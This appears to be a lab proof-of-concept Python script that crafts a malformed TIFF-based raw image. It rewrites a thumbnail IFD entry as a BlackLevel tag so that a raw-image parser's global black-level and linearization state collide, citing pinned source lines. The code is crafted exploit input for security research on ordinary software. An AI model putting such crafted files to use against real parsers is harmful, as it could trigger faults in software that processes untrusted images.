#!/usr/bin/env python3
"""Lab-only W12 probe: put BlackLevel in IFD1 while LinearizationTable lives in IFD0.

Pinned tiff.cpp:1109-1113 (LinearizationTable) calls linear_table(len), which
sets the GLOBAL curve[] and maximum (src/utils/curves.cpp:145-155). Pinned
tiff.cpp:1279-1300 (BlackLevel, tag 0xc61a) sets the GLOBAL `black` when
count==1. IFD0 slot 2 is already LinearizationTable (W11), so this generator
rewrites IFD1 slot 0 (tag 0x00fe, LONG/1, NewSubfileType of the thumbnail) as
0xc61a SHORT/1 with the requested black value. No other bytes change.

usage: craft_dual_knob_poc.py SRC DST BLACK
"""
import struct
import sys

src, dst = sys.argv[1:3]
black = int(sys.argv[3], 0)
assert 0 <= black <= 65535
d = bytearray(open(src, "rb").read())
assert d[:2] == b"II"
ifd0 = struct.unpack_from("<I", d, 4)[0]
n0 = struct.unpack_from("<H", d, ifd0)[0]
ifd1 = struct.unpack_from("<I", d, ifd0 + 2 + 12 * n0)[0]
assert ifd1 == 0x116, hex(ifd1)
e = ifd1 + 2  # IFD1 slot 0
tag, typ, cnt = struct.unpack_from("<HHI", d, e)
assert tag == 0x00FE and typ == 4 and cnt == 1, (hex(tag), typ, cnt)
struct.pack_into("<HHI", d, e, 0xC61A, 3, 1)
struct.pack_into("<HH", d, e + 8, black, 0)
open(dst, "wb").write(d)
print(f"wrote {dst} IFD1 BlackLevel={black:#06x}")
